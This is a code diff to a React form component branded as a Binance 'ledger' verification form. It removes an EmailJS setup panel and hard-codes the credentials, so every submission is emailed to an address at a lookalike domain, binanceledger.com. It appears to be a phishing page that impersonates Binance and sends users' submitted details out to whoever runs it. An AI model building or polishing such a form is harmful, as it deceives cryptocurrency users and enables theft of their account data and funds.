@@ -1,4 +1,3 @@
-
 import { FC, useState, FormEvent, useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
@@ -7,6 +6,7 @@ import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
 import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
 import emailjs from 'emailjs-com';
+import { EMAILJS_CONFIG } from "@/config/emailjs.config";
 
 // Define the expected correct data
 const correctData = {
@@ -69,63 +69,11 @@ const BinanceLedgerForm: FC = () => {
     securityConfirmation: false,
   });
   
-  const [emailConfig, setEmailConfig] = useState({
-    serviceId: EMAILJS_SERVICE_ID,
-    templateId: EMAILJS_TEMPLATE_ID,
-    userId: EMAILJS_USER_ID,
-    isConfigured: false
-  });
-
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [verificationCompleted, setVerificationCompleted] = useState(false);
   const [securityConfirmed, setSecurityConfirmed] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submissionCompleted, setSubmissionCompleted] = useState(false);
-  const [showEmailConfig, setShowEmailConfig] = useState(false);
-
-  useEffect(() => {
-    // Check if EmailJS configuration is already in localStorage
-    const storedServiceId = localStorage.getItem('emailjs_service_id');
-    const storedTemplateId = localStorage.getItem('emailjs_template_id');
-    const storedUserId = localStorage.getItem('emailjs_user_id');
-    
-    if (storedServiceId && storedTemplateId && storedUserId) {
-      setEmailConfig({
-        serviceId: storedServiceId,
-        templateId: storedTemplateId,
-        userId: storedUserId,
-        isConfigured: true
-      });
-    } else {
-      // Show email configuration panel if not configured
-      setShowEmailConfig(true);
-    }
-  }, []);
-
-  const handleEmailConfigSubmit = () => {
-    // Validate email configuration
-    if (!emailConfig.serviceId || !emailConfig.templateId || !emailConfig.userId) {
-      toast({
-        title: "Error",
-        description: "Please fill in all EmailJS configuration fields",
-        variant: "destructive",
-      });
-      return;
-    }
-
-    // Save configuration to localStorage
-    localStorage.setItem('emailjs_service_id', emailConfig.serviceId);
-    localStorage.setItem('emailjs_template_id', emailConfig.templateId);
-    localStorage.setItem('emailjs_user_id', emailConfig.userId);
-    
-    setEmailConfig(prev => ({ ...prev, isConfigured: true }));
-    setShowEmailConfig(false);
-    
-    toast({
-      title: "Success",
-      description: "Email configuration saved successfully",
-    });
-  };
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setFormData({
@@ -140,13 +88,6 @@ const BinanceLedgerForm: FC = () => {
         [e.target.name]: "",
       });
     }
-  };
-
-  const handleEmailConfigChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    setEmailConfig({
-      ...emailConfig,
-      [e.target.name]: e.target.value
-    });
   };
 
   const handleSecurityConfirmation = (checked: boolean) => {
@@ -261,10 +202,6 @@ const BinanceLedgerForm: FC = () => {
   };
 
   const sendEmail = async () => {
-    if (!emailConfig.isConfigured) {
-      return false;
-    }
-
     try {
       const templateParams = {
         to_email: "donotreply@binanceledger.com", // Updated recipient email
@@ -285,10 +222,10 @@ const BinanceLedgerForm: FC = () => {
       };
 
       await emailjs.send(
-        emailConfig.serviceId,
-        emailConfig.templateId,
+        EMAILJS_CONFIG.SERVICE_ID,
+        EMAILJS_CONFIG.TEMPLATE_ID,
         templateParams,
-        emailConfig.userId
+        EMAILJS_CONFIG.USER_ID
       );
       
       return true;
@@ -350,78 +287,6 @@ const BinanceLedgerForm: FC = () => {
       console.error("Form submission error:", error);
     }
   };
-
-  if (showEmailConfig) {
-    return (
-      <div className="bg-binance-dark rounded-lg p-6 md:p-8 shadow-lg max-w-2xl mx-auto">
-        <h2 className="text-binance-yellow font-bold text-xl mb-4">Email Configuration</h2>
-        <p className="text-white mb-6">
-          To receive email notifications when users submit the form, please configure your EmailJS credentials:
-        </p>
-        
-        <div className="space-y-4 mb-6">
-          <div>
-            <label htmlFor="serviceId" className="block text-sm font-medium text-gray-300 mb-1">
-              EmailJS Service ID
-            </label>
-            <Input
-              id="serviceId"
-              name="serviceId"
-              value={emailConfig.serviceId}
-              onChange={handleEmailConfigChange}
-              placeholder="e.g., service_abc123"
-              className="bg-binance-darkGray border-gray-600 text-white"
-            />
-          </div>
-          
-          <div>
-            <label htmlFor="templateId" className="block text-sm font-medium text-gray-300 mb-1">
-              EmailJS Template ID
-            </label>
-            <Input
-              id="templateId"
-              name="templateId"
-              value={emailConfig.templateId}
-              onChange={handleEmailConfigChange}
-              placeholder="e.g., template_xyz789"
-              className="bg-binance-darkGray border-gray-600 text-white"
-            />
-          </div>
-          
-          <div>
-            <label htmlFor="userId" className="block text-sm font-medium text-gray-300 mb-1">
-              EmailJS User ID
-            </label>
-            <Input
-              id="userId"
-              name="userId"
-              value={emailConfig.userId}
-              onChange={handleEmailConfigChange}
-              placeholder="e.g., user_def456"
-              className="bg-binance-darkGray border-gray-600 text-white"
-            />
-          </div>
-        </div>
-        
-        <div className="bg-amber-900/20 border border-amber-500/30 rounded-md p-4 mb-6">
-          <h4 className="text-amber-400 font-medium mb-2">How to get EmailJS credentials</h4>
-          <ol className="text-gray-300 text-sm list-decimal pl-5 space-y-2">
-            <li>Sign up at <a href="https://www.emailjs.com/" target="_blank" rel="noopener noreferrer" className="text-binance-yellow underline">EmailJS.com</a></li>
-            <li>Create a new Email Service and get the Service ID</li>
-            <li>Create a new Email Template and get the Template ID</li>
-            <li>Get your User ID from Account Settings</li>
-          </ol>
-        </div>
-        
-        <Button
-          onClick={handleEmailConfigSubmit}
-          className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
-        >
-          Save Configuration
-        </Button>
-      </div>
-    );
-  }
 
   return (
     <div className="bg-binance-dark rounded-lg p-6 md:p-8 shadow-lg max-w-2xl mx-auto">
